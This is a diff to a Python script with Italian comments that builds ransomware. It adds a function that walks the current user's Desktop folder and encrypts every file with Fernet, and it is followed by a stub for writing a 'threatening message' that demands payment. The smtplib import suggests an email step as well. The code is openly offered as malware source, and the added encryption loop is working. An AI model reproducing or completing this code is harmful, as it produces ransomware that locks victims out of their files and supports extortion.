@@ -1,4 +1,5 @@
 from cryptography.fernet import Fernet
+import os
 import secrets
 import string
 import smtplib
@@ -55,18 +56,27 @@ def cifra_file_singolo(file_path, chiave):
     except Exception as e:
         print(f"Si è verificato un errore durante la cifratura del file: {str(e)}")
 
-# Esempio di utilizzo
-if __name__ == "__main__":
-    file_da_cifrare = "C:\\Users\\rnd\\Desktop\\prova.txt"
-    chiave = Fernet.generate_key().decode()  # Genera una chiave Fernet casuale e la converte in stringa
-    cifra_file_singolo(file_da_cifrare, chiave)
 
 def cifra_tutti_i_file(chiave):
-    """Scorre tutti i file nella directory Desktop
-    dell'utente corrente e li cifra usando la funzione
-    cifra_file_singolo
-    """
-    pass
+    try:
+        # Ottieni la directory Desktop dell'utente corrente
+        desktop_directory = os.path.expanduser("~/Desktop")
+
+        # Itera attraverso tutti i file nella directory Desktop
+        for root, dirs, files in os.walk(desktop_directory):
+            for file_name in files:
+                # Crea il percorso completo del file
+                file_path = os.path.join(root, file_name)
+
+                # Verifica se il file è già cifrato
+                if not file_path.endswith(".enc"):
+                    # Cifra il file solo se non è già cifrato
+                    cifra_file_singolo(file_path, chiave)
+
+        print("Cifratura completata con successo per tutti i file nella directory Desktop.")
+    except Exception as e:
+        print(
+            f"Si è verificato un errore durante la cifratura dei file: {str(e)}")
 
 def scrivi_messaggio_minatorio():
     """Scrive un file di testo con la richiesta di
